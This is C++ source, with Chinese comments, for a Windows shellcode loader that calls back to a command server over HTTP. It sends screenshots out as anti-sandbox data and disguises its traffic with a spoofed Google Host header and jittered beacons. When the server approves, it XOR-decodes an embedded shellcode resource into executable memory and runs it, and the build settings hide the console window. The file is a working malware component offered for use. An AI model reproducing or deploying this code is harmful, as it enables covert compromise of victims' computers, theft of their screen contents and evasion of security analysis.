#include <iostream>
#include <windows.h>
#include "resource.h"

#include "Cryptor.h"
#include "AntiSandbox.h"
#include "HttpConnect.h"

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release
* 2.C/C++
* 代码生成: 运行库(多线程)
* 3.链接器
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
* 系统: 子系统(窗口)
* 高级: 入口点(mainCRTStartup)
*/

using namespace std;

// HTTP 反向 Loader
int main() {
	// 连接信息
	char host[] = "127.0.0.1";
	int port = 1234;
	char requestHeader[] =
		"POST / HTTP/1.1\r\n"
		"Host: www.google.com.hk\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: close\r\n"
		"Content-Length: ";

	char sid[10]; // 会话ID (数据库主键，不保证重复)
	srand(time(NULL));
	sprintf_s(sid, sizeof(sid), "%d", rand() % 10000000);

	char tag[] = "截图"; // 标签

	double iniHeartbeat = 1.5; // 基础心跳
	double heartbeatDevMax = 0.5; // 心跳偏移

	// ShellCode 密钥
	BYTE xor1 = 0xFF;
	BYTE xor2 = 0xFF;

	int determineDataLength;
	char* determineData = NULL;
	BYTE antiSandboxResult = 0x02;
	int partSessionInfoLength = strlen(sid) + 1 + strlen(tag) + 1 + 3;
	while (1) {
		// 睡眠
		double heartbeatDev = ((double)rand() / RAND_MAX) * heartbeatDevMax * 2 - heartbeatDevMax;
		Sleep((iniHeartbeat + heartbeatDev) * 1000);

		// 获取沙箱检测数据
		if (antiSandboxResult == 0x02) {
			free(determineData);
			// determineData = GetDList(&determineDataLength);
			determineData = GetScreenshot(&determineDataLength);
		}

		// 构造会话信息: SID\0Tag\0 + ShellCode密钥 + 沙箱检测数据
		int sessionInfoLength = partSessionInfoLength + determineDataLength + 1;
		char* sessionInfo = (char*)malloc(sessionInfoLength);
		*sessionInfo = '\0';
		sprintf_s(sessionInfo, partSessionInfoLength, "%s%c%s%c%c%c", sid, '\0', tag, '\0', xor1, xor2);
		memcpy(sessionInfo + partSessionInfoLength, determineData, determineDataLength);
		*(sessionInfo + sessionInfoLength - 1) = rand() % 10;
		EncryptData(sessionInfo, sessionInfoLength);

		// 远程抗沙箱
		antiSandboxResult = 0x03; // 0: 关闭; 1: 启动; 2: 重新获取沙箱检测数据
		BYTE receiveXor1 = 0x00;
		BYTE receiveXor2 = 0x00;
		HttpRequest(host, port, requestHeader, sessionInfo, sessionInfoLength, &antiSandboxResult, &receiveXor1, &receiveXor2);
		if (antiSandboxResult == 0x00) {
			return 0;
		}
		else if (antiSandboxResult == 0x01) {
			HRSRC res = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), L"BIN");
			DWORD size = SizeofResource(NULL, res);
			PBYTE load = (PBYTE)LoadResource(NULL, res);
			PBYTE shellcode = (PBYTE)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			for (int i = 0; i < size; i++) {
				*(shellcode + i) = *(load + i) ^ receiveXor1 ^ receiveXor2;
			}
			((void(*)(...))shellcode)(shellcode);
		}
		free(sessionInfo);
	}
}